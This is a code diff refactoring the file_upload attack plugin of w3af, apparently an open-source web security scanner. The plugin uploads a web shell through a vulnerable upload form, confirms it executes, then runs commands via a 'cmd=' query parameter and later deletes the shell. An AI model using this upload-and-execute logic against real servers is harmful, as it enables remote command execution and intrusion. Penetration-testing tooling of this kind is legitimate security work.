@@ -19,8 +19,6 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
-import os.path
-
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
@@ -58,7 +56,7 @@ class file_upload(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['file_upload',]
+        return ['file_upload']
 
     def _generate_shell(self, vuln_obj):
         """
@@ -66,11 +64,13 @@ class file_upload(AttackPlugin):
         :return: True is a shell object based on the param vuln was created ok.
         """
         # Check if we really can execute commands on the remote server
-        if self._verify_vuln(vuln_obj):
+        exploit_url = self._verify_vuln(vuln_obj)
+
+        if exploit_url is not None:
 
             # Set shell parameters
             shell_obj = FileUploadShell(vuln_obj, self._uri_opener,
-                                        self.worker_pool, self._exploit)
+                                        self.worker_pool, exploit_url)
             return shell_obj
         else:
             return None
@@ -82,50 +82,52 @@ class file_upload(AttackPlugin):
         :param vuln_obj: The vuln to exploit.
         :return : True if vuln can be exploited.
         """
-        if not 'file_vars' in vuln_obj:
-            return False
+        if not vuln_obj.get_mutant().get_fuzzable_request().get_file_vars():
+            return None
 
         url = vuln_obj.get_url()
         extension = url.get_extension()
 
         for file_content, file_name in self._get_web_shells(extension):
-            if self._upload_shell_and_confirm_exec(vuln_obj, file_content, file_name):
-                return True
+            exploit_url = self._upload_shell_and_confirm_exec(vuln_obj,
+                                                              file_content,
+                                                              file_name)
+
+            if exploit_url is not None:
+                return exploit_url
 
         #   If we got here, there is nothing positive to report
-        return False
+        return None
 
     def _upload_shell_and_confirm_exec(self, vuln_obj, file_content, file_name):
         """
         :return: True if we were able to upload and the remote server actually
                  executes the remote file.
         """
-        # The vuln was saved to the kb as a vuln object
-        method = vuln_obj.get_method()
-        exploit_dc = vuln_obj.get_dc()
+        mutant = vuln_obj.get_mutant()
+        mutant = mutant.copy()
 
         # Create a file that will be uploaded
         file_handler = NamedStringIO(file_content, file_name)
+        mutant.set_token_value(file_handler)
 
-        for file_var_name in vuln_obj['file_vars']:
-            # the [0] was added here to support repeated parameter names
-            exploit_dc[file_var_name][0] = file_handler
+        # For the files which are not in the target, set something smart.
+        mutant.get_dc().smart_fill()
 
         # Upload the file
-        http_method = getattr(self._uri_opener, method)
-        http_method(vuln_obj.get_url(), exploit_dc)
+        self._uri_opener.send_mutant(mutant)
 
         # Call the uploaded script with an empty value in cmd parameter
         # this will return the shell_handler.SHELL_IDENTIFIER if success
         dst = vuln_obj['file_dest']
-        self._exploit = dst.get_domain_path().url_join(file_name)
-        self._exploit.querystring = u'cmd='
-        response = self._uri_opener.GET(self._exploit)
+        exploit_url = dst.get_domain_path().url_join(file_name)
+        exploit_url.querystring = u'cmd='
+        response = self._uri_opener.GET(exploit_url)
 
         if shell_handler.SHELL_IDENTIFIER in response.get_body():
-            return True
+            return exploit_url
 
-        return False
+        return None
 
     def _get_web_shells(self, extension):
         """
@@ -175,7 +177,7 @@ class FileUploadShell(ExecShell):
         
         self._exploit_url = exploit_url
             
-    def get_exploit_URL(self):
+    def get_exploit_url(self):
         return self._exploit_url
 
     @exec_debug
@@ -190,7 +192,7 @@ class FileUploadShell(ExecShell):
         :param command: The command to handle ( ie. "read", "exec", etc ).
         :return: The result of the command.
         """
-        to_send = self.get_exploit_URL()
+        to_send = self.get_exploit_url()
         to_send.querystring = u'cmd=' + command
         response = self._uri_opener.GET(to_send)
         return shell_handler.extract_result(response.get_body())
@@ -199,7 +201,7 @@ class FileUploadShell(ExecShell):
         msg = 'File upload shell is going to delete the webshell that was'\
               ' uploaded before.'
         om.out.debug(msg)
-        file_to_del = self.get_exploit_URL().get_file_name()
+        file_to_del = self.get_exploit_url().get_file_name()
 
         try:
             self.unlink(file_to_del)
